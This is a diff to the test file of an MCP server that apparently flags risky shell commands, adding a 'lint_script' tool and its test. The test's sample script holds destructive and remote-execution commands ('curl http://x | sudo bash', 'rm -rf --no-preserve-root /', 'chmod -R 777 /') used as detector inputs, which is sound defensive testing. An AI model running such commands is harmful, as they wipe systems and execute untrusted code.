@@ -47,10 +47,10 @@ test("MCP server: initialize, tools/list, tools/call", async () => {
 
   // tools/list
   const names = by(2).result.tools.map((t) => t.name).sort();
-  assert.deepEqual(names, ["check_command_safety", "explain_command"]);
+  assert.deepEqual(names, ["check_command_safety", "explain_command", "lint_script"]);
   for (const t of by(2).result.tools) {
     assert.equal(t.inputSchema.type, "object");
-    assert.deepEqual(t.inputSchema.required, ["command"]);
+    assert.deepEqual(t.inputSchema.required, t.name === "lint_script" ? ["script"] : ["command"]);
   }
 
   // danger verdict
@@ -64,6 +64,32 @@ test("MCP server: initialize, tools/list, tools/call", async () => {
   // explain
   assert.ok(by(5).result.structuredContent.explanations.length >= 1);
   assert.equal(by(5).result.structuredContent.tool, "cmdxray");
+});
+
+test("MCP server: lint_script scans a whole script and flags every risky line", async () => {
+  const script =
+    "#!/bin/bash\necho hi\ncurl http://x | sudo bash\nrm -rf --no-preserve-root /\nchmod -R 777 /\nls -la\n";
+  const out = await runSession([
+    { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18" } },
+    { jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "lint_script", arguments: { script } } },
+    { jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "lint_script", arguments: { script: "echo hi\nls -la\n" } } },
+    { jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: "lint_script", arguments: { script: "   " } } },
+  ]);
+  const by = (id) => out.find((m) => m.id === id);
+
+  // dangerous script: danger verdict, findings carry line numbers, comment/shebang skipped
+  const sc = by(2).result.structuredContent;
+  assert.equal(sc.risk, "danger");
+  assert.ok(sc.danger >= 2);
+  assert.ok(sc.findings.length >= 3);
+  assert.ok(sc.findings.every((f) => typeof f.line === "number" && f.line >= 3));
+  assert.match(by(2).result.content[0].text, /DANGER/);
+
+  // safe script: none
+  assert.equal(by(3).result.structuredContent.risk, "none");
+
+  // empty/whitespace script: friendly error
+  assert.equal(by(4).result.isError, true);
 });
 
 test("MCP server: unknown method returns -32601; bad args are handled", async () => {
